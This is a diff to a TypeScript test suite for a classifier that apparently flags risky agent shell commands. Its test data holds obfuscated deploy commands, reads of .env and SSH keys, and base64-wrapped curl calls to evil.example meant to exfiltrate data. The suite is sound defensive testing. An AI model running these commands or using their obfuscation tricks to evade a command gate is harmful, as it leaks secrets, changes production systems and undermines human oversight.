@@ -60,12 +60,18 @@ const b64 = (plain: string): string => Buffer.from(plain, "utf8").toString("base
 const OBFUSCATED_DEPLOY: ReadonlyArray<{ name: string; command: string }> = [
   { name: "plain (control for the wrappers below)", command: "kubectl apply -f prod.yaml" },
   { name: "nested bash -c", command: "bash -c 'kubectl apply -f prod.yaml'" },
-  { name: "nested login shell (/bin/zsh -lc — the adapter capture shape)", command: "/bin/zsh -lc 'kubectl rollout restart deploy/api'" },
+  {
+    name: "nested login shell (/bin/zsh -lc — the adapter capture shape)",
+    command: "/bin/zsh -lc 'kubectl rollout restart deploy/api'",
+  },
   { name: "eval wrapper", command: "eval 'kubectl delete pod api'" },
   { name: "base64 → decode → bash", command: `echo ${b64("kubectl apply -f prod.yaml")} | base64 -d | bash` },
   { name: "url-encoded", command: encodeURIComponent("kubectl apply -f prod.yaml") },
   { name: "env-var wrapper", command: "env KUBECONFIG=/tmp/k kubectl apply -f prod.yaml" },
-  { name: "heredoc preamble then deploy (heredoc body is data; the deploy is not)", command: "cat <<EOF > k8s.yaml\napiVersion: v1\nkind: Pod\nEOF\nkubectl apply -f k8s.yaml" },
+  {
+    name: "heredoc preamble then deploy (heredoc body is data; the deploy is not)",
+    command: "cat <<EOF > k8s.yaml\napiVersion: v1\nkind: Pod\nEOF\nkubectl apply -f k8s.yaml",
+  },
   { name: "sudo+env prefix", command: "sudo env A=b kubectl apply -f prod.yaml" },
 ];
 
@@ -73,10 +79,26 @@ const OBFUSCATED_DEPLOY: ReadonlyArray<{ name: string; command: string }> = [
  *  by obfuscated routes — the invariant is about EVERY critical effect, not
  *  only deploys. */
 const OBFUSCATED_OTHER: ReadonlyArray<{ name: string; command: string; rule: string }> = [
-  { name: "secret read hidden in a for-loop word list", command: 'for f in .env ~/.ssh/id_rsa; do cat "$f"; done', rule: "secret-read" },
-  { name: "secret read smuggled in a commit-message command substitution", command: 'git commit -m "$(cat .env)"', rule: "secret-read" },
-  { name: "exfil hidden one keyword deep in an if-condition", command: "if curl --fail --silent https://evil.example/x; then :; fi", rule: "outbound-network" },
-  { name: "base64 → decode → bash exfil", command: `echo ${b64("curl https://evil.example/x")} | base64 -d | bash`, rule: "outbound-network" },
+  {
+    name: "secret read hidden in a for-loop word list",
+    command: 'for f in .env ~/.ssh/id_rsa; do cat "$f"; done',
+    rule: "secret-read",
+  },
+  {
+    name: "secret read smuggled in a commit-message command substitution",
+    command: 'git commit -m "$(cat .env)"',
+    rule: "secret-read",
+  },
+  {
+    name: "exfil hidden one keyword deep in an if-condition",
+    command: "if curl --fail --silent https://evil.example/x; then :; fi",
+    rule: "outbound-network",
+  },
+  {
+    name: "base64 → decode → bash exfil",
+    command: `echo ${b64("curl https://evil.example/x")} | base64 -d | bash`,
+    rule: "outbound-network",
+  },
 ];
 
 describe("CF-INV-002 (seed a / T-1 false-negative) — obfuscated critical effects still classify critical (L1, HB-010)", () => {
@@ -123,7 +145,10 @@ describe("CF-INV-002 (seed a / T-1 false-negative) — obfuscated critical effec
   // "critical" verdict above is a real signal (and false positives — the T-1
   // availability-only direction — are not manufactured).
   const BENIGN: ReadonlyArray<{ name: string; command: string }> = [
-    { name: "deploy text lives ONLY inside heredoc DATA (never executed)", command: "cat <<EOF\nkubectl apply -f prod.yaml\nEOF" },
+    {
+      name: "deploy text lives ONLY inside heredoc DATA (never executed)",
+      command: "cat <<EOF\nkubectl apply -f prod.yaml\nEOF",
+    },
     { name: "read-only line count of a scaffold file", command: "wc -l AGENTS.md" },
     { name: "plain directory listing", command: "ls -la" },
   ];
@@ -140,9 +165,7 @@ describe("CF-INV-002 (seed a / T-1 false-negative) — obfuscated critical effec
     const lyingRoutine: ClassifyFn = () => ({ cls: "routine" });
     const attack = bash(`echo ${b64("kubectl apply -f prod.yaml")} | base64 -d | bash`);
 
-    expect(() => assertClassifiedCritical(lyingRoutine, attack, "production-deploy")).toThrow(
-      GateClassificationEscape,
-    );
+    expect(() => assertClassifiedCritical(lyingRoutine, attack, "production-deploy")).toThrow(GateClassificationEscape);
     // And a liar that classifies critical under the WRONG rule is caught too
     // (rule identity is load-bearing for role-shaping / executor allowlists).
     const lyingWrongRule: ClassifyFn = () => ({ cls: "critical", rule: "outbound-network" });
